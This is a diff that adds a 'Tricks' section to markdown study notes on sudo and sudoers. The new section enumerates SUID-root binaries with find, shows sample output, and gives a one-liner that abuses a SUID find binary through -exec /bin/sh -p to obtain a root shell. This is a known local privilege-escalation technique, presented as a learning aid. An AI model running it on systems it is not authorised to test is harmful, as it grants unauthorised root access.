@@ -193,6 +193,43 @@ If a command is specified and is permitted by the security policy, the fully-qua
 When editing the sudoers file (to add or remove users) you should use `visudo`. The `visudo` command not only checks syntax and parsing, it also prevents the file from being edited by multiple people at the same time.
 
 Using `visudo` will launch a command line editor like nano. You can set the editor it uses with `sudo EDITOR=nano visudo`. `visudo` will not allow your changes to be saved *if they don't pass its tests*. 
+## Tricks
+### Finding all the executables execurted by `root`
+```bash
+find / -user root -perm -4000 -print 2>/dev/null
+
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/find
+/usr/bin/sudo
+/usr/sbin/pppd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+```
+#### Privesc (w/ `find`)
+Since `/usr/bin/find` was in the output of the previous command, can privesc. The output from `find --help` shows this:
+```bash
+...
+actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
+      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
+      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
+      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
+...
+```
+So, use `find -exec` to execute commands (they will execute as root):
+```bash
+find .\ -exec /bin/sh -p \; -quit
+```
 
 > [!Resources:]
 > - [Linuxize: Understanding the /etc/shadow File](https://linuxize.com/post/etc-shadow-file/)
